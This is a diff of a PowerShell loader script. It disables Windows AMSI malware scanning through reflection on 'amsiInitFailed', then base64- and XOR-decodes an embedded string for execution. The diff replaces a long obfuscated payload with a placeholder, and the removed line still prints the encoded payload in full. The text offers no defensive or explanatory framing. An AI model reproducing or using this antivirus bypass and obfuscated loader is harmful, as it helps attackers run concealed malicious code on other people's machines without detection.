@@ -2,7 +2,7 @@ $Amsi = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
 $Field = $Amsi.GetField("amsiInitFailed","NonPublic,Static")
 $Field.SetValue($null,$true)
 $k=23
-$e='M3R7fnJ5YzcqN1lyYDpYdX1ydGM3RG5kY3J6OVlyYzlEeHR8cmNkOUNUR1R7fnJ5Yz8wJi4lOSYhLzkmLi85JiMmMDsuJycmPiwaHTNkY2Vydno3KjczdHt+cnljOVByY0RjZXJ2ej8+LBodTHVuY3JMSkozdW5jcmQ3KjcnOTkhIiIkImsybCdqLBodYH9+e3I/PzN+Nyo3M2RjZXJ2ejlFcnZzPzN1bmNyZDs3Jzs3M3VuY3JkOVtyeXBjfz4+Nzp5cjcnPmwaHTczc3ZjdjcqNz9ZcmA6WHV9cnRjNzpDbmdyWXZ6cjdEbmRjcno5Q3JvYzlWRFReXlJ5dHhzfnlwPjlQcmNEY2V+eXA/M3VuY3JkOyc7NzN+PiwaHTczZHJ5c3V2dHw3Kjc/XnlheHxyOlJvZ2VyZGR+eHk3M3N2Y3Y3JSkxJjdrN1hiYzpEY2V+eXA3PiwaHTczZHJ5c3V2dHwlNyo3M2RyeXN1dnR8Nzw3MEdENzA3PDc/Z2BzPjlHdmN/Nzw3MCk3MCwaHTczZHJ5c3VuY3I3Kjc/TGNyb2M5cnl0eHN+eXBKLS1WRFReXj45UHJjVW5jcmQ/M2RyeXN1dnR8JT4sGh03M2RjZXJ2ejlAZX5jcj8zZHJ5c3VuY3I7JzszZHJ5c3VuY3I5W3J5cGN/PiwaHTczZGNlcnZ6OVF7YmR/Pz4aHWoaHTN0e35yeWM5VHt4ZHI/Phod'
+$e='PAYLOAD_BASE_64'
 $b=[Convert]::FromBase64String($e)
 $d=$b | ForEach-Object { $_ -bxor $k }
 $s=[System.Text.Encoding]::UTF8.GetString($d)
